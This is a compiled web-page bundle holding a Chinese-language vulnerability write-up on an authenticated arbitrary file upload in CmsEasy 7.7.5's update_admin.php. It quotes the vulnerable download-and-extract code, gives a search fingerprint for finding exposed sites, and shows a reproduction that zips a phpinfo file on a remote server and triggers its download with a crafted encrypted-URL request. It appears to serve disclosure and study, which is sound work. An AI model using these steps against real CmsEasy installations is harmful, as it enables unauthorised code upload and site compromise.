import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as a}from"./app-58e4a7d6.js";const s={},l=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>CmsEasy 后台存在任意文件上传漏洞，通过文件 service.php 加密Url参数执行即可上传任意文件</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>CmsEasy V7.7.5_20210919
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>body=&quot;cmseasyedit&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181436747.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>存在漏洞的文件为 <code>lib/admin/update_admin.php</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181437877.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>其中需要注意的代码为</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>function downfile_action()
    {
        $url = front::get(&#39;url&#39;);
        $url=service::getInstance()-&gt;unlockString($url,&quot;cmseasy_url&quot;);
        $res = $this-&gt;get_file($url, &#39;cache&#39;);
        if (!$res) {
            $res = array(
                &#39;err&#39; =&gt; 1,
                &#39;data&#39; =&gt; lang_admin(&#39;update_package_download_failed&#39;),
            );
        } else {
            @unlink(&#39;upgrade/config_cn.php&#39;);
            @unlink(&#39;upgrade/config_cn.tmp.php&#39;);
            @unlink(&#39;upgrade/upgrade.sql&#39;);
            @unlink(&#39;upgrade/command.php&#39;);
            front::remove(ROOT.&#39;/cache/data&#39;);
            front::remove(ROOT.&#39;/cache/template&#39;);//清空全部语言
            $langdata=getlang();
            if($langdata != &quot;&quot;){
                foreach ($langdata as $key=&gt;$val){
                    front::remove(ROOT.&#39;/cache/&#39;.$val[&#39;langurlname&#39;]);
                    front::remove(ROOT.&#39;/&#39;.$val[&#39;langurlname&#39;].&#39;/template&#39;);
                }
            }
            //先清空缓存
            user::deletesession();
            category::deletesession();
            //提取分类
            if(file_exists(ROOT.&quot;/lib/table/type.php&quot;)) {
                type::deletesession();
            }
            //提取专题
            if(file_exists(ROOT.&quot;/lib/table/special.php&quot;)) {
                special::deletesession();
            }
            $archive = new PclZip(&#39;cache/patch.zip&#39;);
            $archive-&gt;extract(PCLZIP_OPT_PATH, ROOT, PCLZIP_OPT_REPLACE_NEWER);

            if(file_exists(&#39;upgrade/upgrade.sql&#39;)) {
                $sqlquery = file_get_contents(&#39;upgrade/upgrade.sql&#39;);
                $sqlquery = str_replace(&#39;\`cmseasy_&#39;, &#39;\`&#39; . config::getdatabase(&#39;database&#39;, &#39;prefix&#39;), $sqlquery);

                $sqlquery = str_replace(&quot;\\r&quot;, &quot;&quot;, $sqlquery);
                $sqls = preg_split(&quot;/;(--)*[ \\t]{0,}\\n/&quot;, $sqlquery);
                $this-&gt;exec_cms_sql($sqls);
            }

            if(file_exists(&#39;upgrade/command.php&#39;)){
                include ROOT . &#39;/upgrade/command.php&#39;;
            }
            $res = array(
                &#39;err&#39; =&gt; 0,
                &#39;message&#39; =&gt; $this-&gt;message,
                &#39;data&#39; =&gt; lang_admin(&#39;upgrade_successful&#39;),
            );
        }

        echo json_encode($res);
        exit;
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中使用 unlockString 和 get_file 方法</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$url = front::get(&#39;url&#39;);
$url=service::getInstance()-&gt;unlockString($url,&quot;cmseasy_url&quot;);
$res = $this-&gt;get_file($url, &#39;cache&#39;);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181437707.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>写入后在上层目录写入文件，即Web根目录，创建压缩包并上传可访问的服务器上</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>zip phpinfo.zip phpinfo.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>构造下载请求</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181437504.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/index.php?case=update&amp;act=downfile&amp;admin_dir=admin&amp;site=default&amp;url=buTdBnP8%3DJ%3DELYuF8Z2IwZyM-awr9fH%3D0cax6mxICukxw
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181438629.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181438160.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,22),d=[l];function r(t,c){return i(),n("div",null,d)}const m=e(s,[["render",r],["__file","CmsEasy update_admin.php 后台任意文件上传漏洞.html.vue"]]);export{m as default};
